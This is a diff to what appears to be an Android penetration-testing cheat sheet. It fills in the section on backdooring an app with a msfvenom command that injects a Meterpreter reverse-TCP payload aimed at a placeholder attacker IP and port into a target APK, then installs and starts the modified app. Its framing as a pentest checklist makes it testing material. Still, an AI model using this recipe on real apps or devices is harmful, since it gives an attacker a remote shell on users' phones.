@@ -554,8 +554,24 @@ i) apk decompiler for lazy: https://github.com/b-mueller/apkx
 4b) OTHER WAYS TO BACKDOOR AN APP
 /////////////////////////////////</i>
 
-    !!! TBD !!! - appreciate any input here!! 
+    Thanks to msfvenom, there is a quick and easy way:
+    
+    [COMMAND]
+        -) msfvenom -x target_app.apk -p android/meterpreter/reverse_tcp LHOSt=<ATTACKER-IP> LPORT=<ATTACKER-PORT> -o target_modified.apk
+        -) adb install target_modified.apk
+        -) start app
+        
+    [INFO]
+        !) Works with Xamarin apps too (this made me very happy)
+        
+    [THINGS TO REPORT]
+        !) If it works (don't give up if it does not work the easy way)
 
+    [MORE DETAILS]
+        ?) <a href="https://hydrasky.com/mobile-security/injecting-metasploit-payloads-into-file-apk-android-application/" target="_blank">Simple apk injection</a>
+    
+    !!! ANY OTHER IDEAS? appreciate any input here !!!
+    
 <i>///////////////
 4c) ANDROID NDK
 ///////////////</i>
